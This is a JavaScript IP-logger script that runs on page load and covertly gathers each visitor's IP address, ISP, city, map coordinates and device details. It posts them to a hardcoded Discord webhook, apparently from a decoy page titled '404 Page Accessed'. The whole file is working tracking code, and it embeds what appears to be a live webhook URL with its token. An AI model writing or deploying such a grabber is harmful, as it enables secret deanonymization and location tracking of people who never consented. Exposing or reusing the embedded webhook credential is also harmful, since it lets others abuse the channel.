// 🔴 PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW 🔴
const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";

// Run immediately
(function autoRun() {

    // 1. Gather Basic Info (Fast)
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenRes: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || "Direct Link"
    };

    // 2. Get IP Info
    // We use ipapi.co. If this fails, we still want to try to send device info.
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            sendWebhook(data, deviceInfo);
        })
        .catch(error => {
            console.log("IP API failed, sending device info only:", error);
            // Send whatever we have even if IP fails
            sendWebhook({}, deviceInfo);
        });

})();

// Function to send the data
function sendWebhook(ipData, device) {
    
    // Try to get battery (Optional - if it fails, we ignore it so the webhook still sends)
    let batteryText = "Unknown";
    if (navigator.getBattery) {
        navigator.getBattery().then(batt => {
            batteryText = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
        }).catch(() => {}); // Silently ignore battery errors
    }

    // Prepare Payload
    const payload = {
        username: "Logger",
        embeds: [
            {
                title: "404 Page Accessed",
                color: 16711740,
                fields: [
                    // NETWORK
                    { name: "IP Address", value: ipData.ip || "Unknown", inline: true },
                    { name: "Network/ISP", value: ipData.org || "Unknown", inline: true },
                    { name: "Location", value: `${ipData.city || "?"}, ${ipData.country_name || "?"}`, inline: true },
                    { name: "Coords", value: ipData.latitude ? `[${ipData.latitude}, ${ipData.longitude}](https://maps.google.com/?q=${ipData.latitude},${ipData.longitude})` : "Unknown", inline: false },
                    
                    // DEVICE
                    { name: "Platform", value: device.platform, inline: true },
                    { name: "Screen", value: device.screenRes, inline: true },
                    { name: "Window Size", value: device.windowSize, inline: true },
                    { name: "Timezone", value: device.timezone, inline: true },
                    
                    // EXTRAS
                    { name: "Referrer", value: device.referrer, inline: false },
                    { name: "User Agent", value: device.userAgent, inline: false }
                ],
                footer: { text: "Access Log" },
                timestamp: new Date()
            }
        ]
    };

    // Send it
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(res => console.log("Webhook response:", res.status))
    .catch(err => console.error("Webhook error:", err));
}
